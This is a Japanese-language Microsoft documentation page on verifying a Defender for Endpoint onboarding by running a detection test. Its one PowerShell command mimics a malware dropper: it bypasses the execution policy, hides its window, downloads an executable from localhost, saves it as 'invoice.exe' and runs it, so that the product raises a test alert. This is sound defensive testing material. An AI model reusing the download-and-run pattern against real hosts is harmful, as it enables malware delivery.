---
title: 新しくオンボードされた Microsoft Defender ATP デバイスで検出テストを実行する
description: 新しくオンボードされたデバイスで検出スクリプトを実行して、Microsoft Defender ATP サービスに正しくオンボードされていることを確認します。
keywords: 検出テスト、検出、powershell、スクリプト、検証、オンボーディング、エンドポイントオンボーディング用 Microsoft Defender、クライアント、サーバー、テスト
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10154a734bb4c3d8b26fffb8618484aeb11f907a
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/23/2021
ms.locfileid: "51066092"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>新しくオンボードされた Microsoft Defender for Endpoint デバイスで検出テストを実行する 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**適用対象:**
- サポートされている Windows 10 バージョン
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server バージョン 1803
- Windows Server、 2019
- [Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Microsoft Defender for Endpoint を体験してみませんか? [無料試用版にサインアップします。](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

新しくオンボードされたデバイスで次の PowerShell スクリプトを実行して、Defender for Endpoint サービスに適切に報告されていることを確認します。

1. フォルダーを作成する: 'C:\test-MDATP-test'。
2. デバイスで管理者特権のコマンド ライン プロンプトを開き、スクリプトを実行します。

   1. **[スタート]** をクリックし、「**cmd**」と入力します。

   1. [コマンド プロンプト] を **右クリックし、[** 管理者として **実行] を選択します**。

      ![[ウィンドウのスタート] メニューの [管理者として実行] をポイントする](images/run-as-admin.png)

3. プロンプトで、次のコマンドをコピーして実行します。

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

[コマンド プロンプト] ウィンドウが自動的に閉じます。 成功した場合、検出テストは完了としてマークされ、約 10 分でオンボード デバイスのポータルに新しいアラートが表示されます。

## <a name="related-topics"></a>関連項目
- [オンボード Windows 10 デバイス](configure-endpoints.md)
- [オンボード サーバー](configure-server-endpoints.md)
- [Microsoft Defender for Endpoint オンボーディングの問題のトラブルシューティング](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
